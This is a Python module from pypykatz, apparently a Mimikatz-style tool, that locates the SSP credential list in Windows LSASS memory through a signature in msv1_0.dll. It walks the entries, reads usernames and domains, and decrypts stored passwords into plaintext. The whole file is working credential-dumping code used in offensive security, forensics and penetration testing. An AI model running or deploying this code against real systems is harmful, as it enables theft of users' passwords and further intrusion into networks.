#!/usr/bin/env python3
#
# Author:
#  Tamas Jos (@skelsec)
#
import io
import logging
from pypykatz.lsadecryptor.package_commons import *

class SspCredential:
	def __init__(self):
		self.credtype = 'ssp'
		self.username = None
		self.domainname = None
		self.password = None
		self.luid = None
	
	def to_dict(self):
		t = {}
		t['credtype'] = self.credtype
		t['username'] = self.username
		t['domainname'] = self.domainname
		t['password'] = self.password
		t['luid'] = self.luid
		return t
		
	def to_json(self):
		return json.dumps(self.to_dict())
		
	def __str__(self):
		t = '\t== SSP [%x]==\n' % self.luid
		t += '\t\tusername %s\n' % self.username
		t += '\t\tdomainname %s\n' % self.domainname
		t += '\t\tpassword %s\n' % self.password
		return t
		
class SspDecryptor(PackageDecryptor):
	def __init__(self, reader, decryptor_template, lsa_decryptor):
		super().__init__('Ssp')
		self.reader = reader
		self.decryptor_template = decryptor_template
		self.lsa_decryptor = lsa_decryptor
		self.credentials = []
		
	def find_signature(self):
		logging.log(1, '[SspDecryptor] Searching for key struct signature')
		fl = self.reader.find_in_module('msv1_0.dll',self.decryptor_template.signature)
		if len(fl) == 0:
			raise Exception('[SspDecryptor] Signature was not found! %s' % self.decryptor_template.signature.hex())
		return fl[0]

	def find_first_entry(self):
		position = self.find_signature()
		ptr_entry_loc = self.reader.get_ptr_with_offset(position + self.decryptor_template.first_entry_offset)
		ptr_entry = self.reader.get_ptr(ptr_entry_loc)
		return ptr_entry, ptr_entry_loc
		
	def add_entry(self, ssp_entry):
		c = SspCredential()
		c.luid = ssp_entry.LogonId
		c.username = ssp_entry.credentials.UserName.read_string(self.reader)
		c.domainname = ssp_entry.credentials.Domaine.read_string(self.reader)
		if ssp_entry.credentials.Password.Length != 0:
			if ssp_entry.credentials.Password.Length % 8 != 0:
				#for orphaned creds
				c.password = ssp_entry.credentials.Password.read_data(self.reader).hex()
			else:
				enc_data = ssp_entry.credentials.Password.read_data(self.reader)
				dec_data = self.lsa_decryptor.decrypt(enc_data)
				try:
					c.password = dec_data.decode('utf-16-le').rstrip('\x00')
				except:
					c.password = dec_data.hex()
					pass
					
		self.credentials.append(c)
	
	def start(self):
		try:
			entry_ptr_value, entry_ptr_loc = self.find_first_entry()
		except Exception as e:
			logging.log(1,'Failed to find Ssp structs! Reason: %s' % e)
			return
		self.reader.move(entry_ptr_loc)
		entry_ptr = self.decryptor_template.list_entry(self.reader)
		self.walk_list(entry_ptr, self.add_entry)